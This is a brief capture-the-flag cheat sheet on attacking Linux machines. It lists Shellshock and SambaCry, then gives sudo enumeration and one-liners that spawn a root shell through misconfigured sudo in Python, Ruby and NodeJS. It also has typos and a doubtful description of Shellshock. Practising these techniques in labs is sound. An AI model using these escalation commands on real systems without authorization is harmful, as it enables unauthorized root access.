# Attacking Linux Boxes

### Most Common CVEs used on CTFs
| # | CVE | Description |
| --- | --- | --- |
| 1 | [Shellshock](https://www.exploit-db.com/exploits/34900) | Privilage esculation exploit.  Can be used against CGI-Bin also. |
| 2 | [SambaCry](https://redteamzone.com/EternalRed/) | Also known as EternalRed.  This is the EthernalBlue of Linux SMB File Servers. |

### Post Exploitation - Prev. Esculation

*Enumerate Misconfigured `sudo`*
Run this command to see what programs you has access to using sudo.
```
sudo -l
```

*Exploiting Misconfigured `sudo`*
| # | Language | Commands |
| --- | --- | --- |
| 1 | Python | `sudo python3 -c 'import os; os.system("/bin/bash")'`
| 2 | Ruby | `sudo ruby -e 'system("/bin/bash")'` |
| 3 | NodeJS | `node -e '[...]()'` |

*NodeJS Privilage Exculation Script*
```Javascript
var exec = require('child_process').exec;
exec('[COMMAND]', function (error, stdOut, stdErr) {
console.log(stdOut);
});
```
